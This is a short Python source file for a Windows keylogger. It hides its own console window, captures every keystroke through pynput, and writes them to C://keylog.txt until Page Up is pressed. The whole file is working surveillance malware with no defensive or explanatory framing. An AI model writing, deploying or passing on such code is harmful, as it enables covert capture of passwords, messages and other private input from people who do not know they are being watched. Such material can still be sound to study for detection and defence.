import win32console
import win32gui
from pynput.keyboard import Key, Listener

key_presses = []
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

def on_key_press(key):
    key_presses.append(key)
    log_keystrokes(key_presses)

def log_keystrokes(key_presses):
    with open("C://keylog.txt", "w") as logfile:
        for key in key_presses:
            key = str(key).replace("'", "")
            logfile.write(key)

def on_key_release(key):
    if key == Key.page_up:
        return False
    
with Listener(
    on_press = on_key_press,
    on_release = on_key_release
    ) as listener:
    listener.join()



